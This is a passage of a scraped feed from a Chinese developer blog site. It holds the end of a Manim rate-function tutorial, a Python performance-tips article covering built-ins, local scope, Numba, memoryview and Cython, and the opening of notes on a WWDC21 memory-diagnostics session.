<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ba75cc74f304474baa5bc441daa970b1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgZGF0YWJvb2s=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764484065&amp;x-signature=tRI%2BaQnQbSKGg%2FU0%2B9Y7jkVccUU%3D" alt="" loading="lazy"/></p>
<hr/>
<h2 data-id="heading-6">4. 进阶：自定义与时间扭曲</h2>
<p>作为会 <code>Python</code> 的老手，如果内置函数满足不了你怎么办？</p>
<h3 data-id="heading-7">4.1. 自定义函数 (Lambda大法)</h3>
<p><code>rate_func</code> 接受任何一个 <code>Python</code> 函数。</p>
<p>比如，你想做一个简单的“先慢后快”的加速效果，可以直接用 <code>Lambda</code>：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># y = x^2，典型的加速曲线</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">CustomRateFuncDemo</span>(<span class="hljs-title class_ inherited__">Scene</span>):
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">construct</span>(<span class="hljs-params">self</span>):
        <span class="hljs-comment"># 创建一个圆</span>
        circle = Circle(radius=<span class="hljs-number">0.5</span>, color=BLUE).shift(LEFT * <span class="hljs-number">2</span>)
        self.add(circle)

        <span class="hljs-comment"># 使用自定义 rate_func（t**2）让圆向右移动</span>
        self.play(circle.animate(rate_func=<span class="hljs-keyword">lambda</span> t: t**<span class="hljs-number">2</span>).shift(RIGHT * <span class="hljs-number">4</span>), run_time=<span class="hljs-number">3</span>)
        self.wait()
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1c07fdccfbf142568d474d62018e7bea~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgZGF0YWJvb2s=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764484065&amp;x-signature=EOzMezuJmYbGmcZSqkTb%2F%2BWPbYs%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-8">4.2. 时间挤压 (Squish Rate Func)</h3>
<p>这是 <code>Manim</code> 中最强大的黑科技之一：<code>squish_rate_func</code>。</p>
<p>假设你写了一个 <code>run_time=6</code> 的动画，但你希望某个特定的变换（比如变色），</p>
<p>在第 <code>1.2</code> 秒到第 <code>3</code> 秒之间（即整个进度的 <code>0.2</code> 到 <code>0.5</code>）由<strong>白色</strong>变成<strong>红色</strong>；</p>
<p>在第 <code>3</code> 秒到第 <code>4.8</code> 秒之间（即整个进度的 <code>0.5</code> 到 <code>0.8</code>）由<strong>红色</strong>变成<strong>绿色</strong>。</p>
<p>你不需要把动画拆成多段写，只需要：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">SquishRateFuncDemo</span>(<span class="hljs-title class_ inherited__">Scene</span>):
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">construct</span>(<span class="hljs-params">self</span>):
        <span class="hljs-comment"># 创建一个圆点</span>
        dot = Dot(color=WHITE).shift(LEFT * <span class="hljs-number">2</span>)
        self.add(dot)

        <span class="hljs-comment"># 使用UpdateFromAlphaFunc来同时控制位置和颜色变化</span>
        <span class="hljs-keyword">def</span> <span class="hljs-title function_">update_dot</span>(<span class="hljs-params">obj, alpha</span>):
            <span class="hljs-comment"># 位置变化 - 使用默认的linear速率</span>
            obj.move_to(LEFT * <span class="hljs-number">2</span> + RIGHT * <span class="hljs-number">5</span> * alpha)

            <span class="hljs-comment"># 颜色变化 - 使用squish_rate_func控制变色的时间段</span>
            squished_alpha = squish_rate_func(smooth, <span class="hljs-number">0.2</span>, <span class="hljs-number">0.5</span>)(alpha)
            squished_alpha2 = squish_rate_func(smooth, <span class="hljs-number">0.5</span>, <span class="hljs-number">0.8</span>)(alpha)

            <span class="hljs-keyword">if</span> alpha &lt; <span class="hljs-number">0.5</span>:
                obj.set_color(interpolate_color(WHITE, RED, squished_alpha))
            <span class="hljs-keyword">else</span>:
                obj.set_color(interpolate_color(RED, GREEN, squished_alpha2))

        self.play(
            UpdateFromAlphaFunc(dot, update_dot),
            run_time=<span class="hljs-number">6</span>,
        )
        self.wait()
</code></pre>
<p>这个技巧在制作复杂的多重同步动画时非常有效！</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4cb02575866740e7bbb2979d4f804ddc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgZGF0YWJvb2s=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764484065&amp;x-signature=3Y3bARnc7xdiRnomMl05wftOnVg%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-9">5. 总结</h2>
<p><code>Manim</code> 不仅仅是动画工具，它更像是一个导演工具。</p>
<ul>
<li><code>linear</code> 是为了表现机械、循环。</li>
<li><code>smooth</code> 是为了表现自然、物理。</li>
<li><code>there_and_back</code> / <code>wiggle</code> 是为了引导观众的注意力。</li>
<li><code>squish_rate_func</code> 是为了精准控制时间轴。</li>
</ul>
<p>下次当你的动画看起来略显生硬时，不妨停下来想一想：<em>“这个动作的节奏对吗？是不是该换个 rate function 了？”</em></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Python性能提升50%：这5个隐藏技巧让你的代码快如闪电⚡]]></title>    <link>https://juejin.cn/post/7575106644498923554</link>    <guid>https://juejin.cn/post/7575106644498923554</guid>    <pubDate>2025-11-23T04:16:58.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575106644498923554" data-draft-id="7575162322239700992" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Python性能提升50%：这5个隐藏技巧让你的代码快如闪电⚡"/> <meta itemprop="keywords" content="后端,前端,人工智能"/> <meta itemprop="datePublished" content="2025-11-23T04:16:58.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="IT_陈寒"/> <meta itemprop="url" content="https://juejin.cn/user/1638743356481367"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Python性能提升50%：这5个隐藏技巧让你的代码快如闪电⚡
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1638743356481367/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    IT_陈寒
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-23T04:16:58.000Z" title="Sun Nov 23 2025 04:16:58 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-23
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    11
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读1分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0"><strong>Python性能提升50%：这5个隐藏技巧让你的代码快如闪电⚡</strong></h2>
<h3 data-id="heading-1">引言</h3>
<p>Python因其简洁易读的语法和强大的生态系统而广受欢迎，但它的性能问题也常常成为开发者诟病的焦点。尽管Python的解释型特性使其在运行时效率上不如C或Rust等编译型语言，但通过一些高级技巧和优化手段，我们仍然可以显著提升Python代码的执行速度——在某些情况下甚至能达到50%以上的性能提升！</p>
<p>本文将深入探讨5个鲜为人知但效果显著的Python性能优化技巧，涵盖从数据结构选择到底层字节码优化的多个层面。无论你是处理大规模数据还是编写高频调用的微服务，这些技巧都能帮助你榨干Python的最后一滴性能潜力。</p>
<hr/>
<h3 data-id="heading-2">1. 利用内置函数和标准库</h3>
<h4 data-id="heading-3">为什么有效？</h4>
<p>Python的内置函数（如<code>map()</code>、<code>filter()</code>、<code>sum()</code>）是用C实现的，比纯Python实现的循环快得多。标准库中的模块（如<code>collections</code>、<code>itertools</code>）也经过了高度优化。</p>
<h4 data-id="heading-4">实战示例</h4>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 慢速版本：纯Python循环</span>
result = []
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1000000</span>):
    result.append(i * <span class="hljs-number">2</span>)

<span class="hljs-comment"># 快速版本：内置map函数</span>
result = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">map</span>(<span class="hljs-keyword">lambda</span> x: x * <span class="hljs-number">2</span>, <span class="hljs-built_in">range</span>(<span class="hljs-number">1000000</span>)))
</code></pre>
<p><strong>性能对比</strong>：在测试中，<code>map</code>版本比循环快约30%-40%。如果结合生成器表达式（如<code>(x*2 for x in range(1000000))</code>），内存占用还会进一步降低。</p>
<h4 data-id="heading-5">进阶技巧</h4>
<ul>
<li>使用<code>collections.deque</code>代替列表实现队列操作（O(1) vs O(n)）。</li>
<li><code>itertools.chain</code>合并多个迭代器时比显式循环更高效。</li>
</ul>
<hr/>
<h3 data-id="heading-6">2. 避免全局变量，拥抱局部作用域</h3>
<h4 data-id="heading-7">Python的变量查找机制</h4>
<p>Python在访问变量时会按顺序查找：局部作用域 -&gt; 闭包 -&gt; 全局 -&gt; 内置。全局变量的查找成本远高于局部变量。</p>
<h4 data-id="heading-8">优化案例</h4>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 慢速版本：频繁访问全局变量</span>
global_var = [...]

<span class="hljs-keyword">def</span> <span class="hljs-title function_">process_data</span>():
    <span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> global_var:
        do_something(item)

<span class="hljs-comment"># 快速版本：将全局变量转为局部</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">process_data_fast</span>(<span class="hljs-params">data</span>):
    <span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> data:
        do_something(item)
</code></pre>
<p><strong>性能提升</strong>：实测中这种改动可带来10%-20%的速度提升，尤其在循环次数多的情况下。</p>
<h4 data-id="heading-9">深层原理</h4>
<p>字节码层面的差异：</p>
<ul>
<li><code>LOAD_GLOBAL</code>操作码需要哈希表查找。</li>
<li><code>LOAD_FAST</code>直接通过数组索引访问局部变量。</li>
</ul>
<hr/>
<h3 data-id="heading-10">3. JIT编译的魔法：PyPy与Numba</h3>
<h4 data-id="heading-11">PyPy的优势</h4>
<p>PyPy是Python的即时编译（JIT）实现，特别适合长时间运行的算法密集型任务（如数值计算）。某些场景下可比CPython快5-10倍！</p>
<h4 data-id="heading-12">Numba的精准打击</h4>
<p>Numba通过装饰器将特定函数编译为机器码：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> numba <span class="hljs-keyword">import</span> jit

<span class="hljs-meta">@jit(<span class="hljs-params">nopython=<span class="hljs-literal">True</span></span>)</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">sum_array</span>(<span class="hljs-params">arr</span>):
    total = <span class="hljs-number">0.0</span>
    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> arr:
        total += x
    <span class="hljs-keyword">return</span> total
</code></pre>
<p><strong>适用场景</strong>：数值计算、NumPy数组操作等，通常可提速50倍以上。但注意首次运行会有编译开销。</p>
<hr/>
<h3 data-id="heading-13">4. 内存视图（Memory Views）与缓冲协议</h3>
<h4 data-id="heading-14">Python的内存瓶颈</h4>
<p>当处理大型数据集（如图像、音频）时，传统的切片复制会引发大量内存分配操作。内存视图允许零复制访问底层缓冲区：</p>
<pre><code class="hljs language-python" lang="python">data = <span class="hljs-built_in">bytearray</span>(...)
view = <span class="hljs-built_in">memoryview</span>(data)
partial_view = view[<span class="hljs-number">1000</span>:<span class="hljs-number">2000</span>] <span class="hljs-comment"># Zero-copy!</span>
</code></pre>
<h4 data-id="heading-15">NumPy的最佳搭档</h4>
<pre><code class="hljs language-python" lang="python">arr = np.zeros(...)
arr_view = arr[:, :, ::<span class="hljs-number">2</span>] <span class="hljs-comment"># No data copied!</span>
</code></pre>
<p><strong>性能影响</strong>：在大数据处理中可减少90%以上的内存分配时间。这也是Pillow、OpenCV等库高性能的关键之一。</p>
<hr/>
<h3 data-id="heading-16">5. C扩展与Cython终极优化</h3>
<h4 data-id="heading-17">Cython的两栖特性</h4>
<p>Cython允许混合编写Python和C代码：</p>
<pre><code class="hljs language-cython" lang="cython"># cython: language_level=3
cimport numpy as np

def fast_sum(np.ndarray[np.float64_t] arr):
    cdef double total = 0.0
    cdef int i
    for i in range(arr.shape[0]):
        total += arr[i]
    return total
</code></pre>
<h4 data-id="heading-18">CPython API直接调用</h4>
<p>对于极端性能需求的部分：</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// example.c</span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;Python.h&gt;</span></span>

<span class="hljs-type">static</span> PyObject* <span class="hljs-title function_">fast_func</span><span class="hljs-params">(PyObject* self, PyObject* args)</span> {
    <span class="hljs-comment">// C implementation here...</span>
}
</code></pre>
<p><strong>实测效果</strong>：经过良好优化的C扩展可比纯Python快100-1000倍（如加密算法、物理模拟）。著名的例子包括lxml、psycopg2等库的核心部分。</p>
<hr/>
<h3 data-id="heading-19">Bonus技巧：字符串操作的黑暗艺术</h3>
<ol>
<li>
<p><strong>join()战胜+运算符</strong></p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># Bad: O(n²) time complexity!</span>
s = <span class="hljs-string">""</span>
<span class="hljs-keyword">for</span> chunk <span class="hljs-keyword">in</span> chunks:
    s += chunk

<span class="hljs-comment"># Good: O(n) with join()</span>
s = <span class="hljs-string">""</span>.join(chunks)
</code></pre>
</li>
<li>
<p><strong>f-string的秘密速度</strong><br/>
f-string不仅是语法糖——它还是最快的字符串格式化方式：</p>
<pre><code class="hljs language-perl" lang="perl">%timeit f<span class="hljs-string">"Value: {x}"</span>          <span class="hljs-comment"># ~80ns </span>
%timeit <span class="hljs-string">"Value: {}"</span>.format(<span class="hljs-keyword">x</span>)   <span class="hljs-comment"># ~150ns </span>
%timeit <span class="hljs-string">"Value: %s"</span> % <span class="hljs-keyword">x</span>         <span class="hljs-comment"># ~120ns </span>
</code></pre>
</li>
</ol>
<hr/>
<h3 data-id="heading-20"><strong>总结与行动指南</strong></h3>
<ol>
<li><strong>优先选择标准库提供的工具</strong>——它们通常是最高效的实现。</li>
<li><strong>将热点代码移出全局作用域</strong>——哪怕只是封装到一个函数里。</li>
<li><strong>对计算密集型任务尝试JIT方案</strong>——PyPy/Numba可能带来质的飞跃。</li>
<li><strong>用内存视图替代数据复制</strong>——特别是处理二进制数据时。</li>
<li><strong>考虑用Cython/C扩展改写关键路径</strong>——当其他优化手段触顶时。</li>
</ol>
<p>记住："过早优化是万恶之源"（Knuth），但在确认真实的性能瓶颈后，这些技巧将成为你工具箱中的利器⚡</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[[WWDC 21]Detect and diagnose memory issues 笔记]]></title>    <link>https://juejin.cn/post/7575152891955462144</link>    <guid>https://juejin.cn/post/7575152891955462144</guid>    <pubDate>2025-11-23T04:25:06.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575152891955462144" data-draft-id="7575090551357358132" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="[WWDC 21]Detect and diagnose memory issues 笔记"/> <meta itemprop="keywords" content="Swift,性能优化"/> <meta itemprop="datePublished" content="2025-11-23T04:25:06.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="songgeb"/> <meta itemprop="url" content="https://juejin.cn/user/3122268752587006"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            [WWDC 21]Detect and diagnose memory issues 笔记
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3122268752587006/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    songgeb
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-23T04:25:06.000Z" title="Sun Nov 23 2025 04:25:06 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-23
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.apple.com%2Fvideos%2Fplay%2Fwwdc2021%2F10180%2F" target="_blank" title="https://developer.apple.com/videos/play/wwdc2021/10180/" ref="nofollow noopener noreferrer">developer.apple.com/videos/play…</a></p>
<h2 data-id="heading-0">概述</h2>
<p>本Session主要解释了App内存由哪些部分组成，并介绍了可以使用Performace XCTests工具对内存问题进行排查、分析</p>
<h2 data-id="heading-1">Impact of Memory footprint</h2>
<p>好的内存管理可以提升用户体验，可以表现在</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e318640848844cd09c97d57606693a9d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgc29uZ2dlYg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764476705&amp;x-signature=N2K9ucCz3r6rB9SsUCxAks11YO8%3D" alt="" loading="lazy"/></p>
<ol>
<li>Faster application activation，因为内存控制的好，所以app进入后台时不易被系统终止，重新激活回到前台时也更快</li>
<li>Responsive experience，更高的响应速度</li>
<li>Complex workflows，内存控制的好则意味着可以增加更多更消耗内存的功能</li>
<li>Wider device compatibility，控制好内存则可以兼容到更老的机器</li>
</ol>
<h2 data-id="heading-2">Memory footprint</h2>
<p>本小节主要介绍Memory footprint都是有哪些内容组成</p>
